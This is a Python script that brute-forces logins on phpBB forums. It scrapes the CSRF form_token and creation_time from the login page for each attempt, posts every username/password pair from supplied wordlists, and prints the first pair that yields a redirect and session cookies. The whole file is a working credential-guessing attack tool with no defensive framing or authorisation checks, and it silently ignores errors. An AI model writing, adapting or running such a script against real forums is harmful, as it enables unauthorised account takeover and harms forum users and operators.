#!/usr/bin/env python3
import sys, requests
from bs4 import BeautifulSoup

if len(sys.argv) < 4:
    print(f"Usage: {sys.argv[0]} <base_url> <users.txt> <passwords.txt>")
    sys.exit(1)

base = sys.argv[1].rstrip('/')
users_file = sys.argv[2]; passwords_file = sys.argv[3]
s = requests.Session()

def fetch_tokens():
    r = s.get(f"{base}/ucp.php?mode=login"); r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name":"form_token"})["value"]
    ctime = soup.find("input", {"name":"creation_time"})["value"]
    return token, ctime

def try_login(u, p):
    token, ctime = fetch_tokens()
    data = {"username":u,"password":p,"login":"Login",
            "form_token":token,"creation_time":ctime,"redirect":"index.php"}
    r = s.post(f"{base}/ucp.php?mode=login", data=data, allow_redirects=False)
    if r.status_code in (302, 303) and any(k.startswith("phpbb3_") for k in s.cookies.keys()):
        print(f"[+] SUCCESS {u}:{p}")
        return True
    return False

users = [x.strip() for x in open(users_file) if x.strip()]
pwds  = [x.strip() for x in open(passwords_file) if x.strip()]
for u in users:
    for p in pwds:
        try:
            if try_login(u, p): sys.exit(0)
        except Exception: pass
print("[-] No valid combo found")
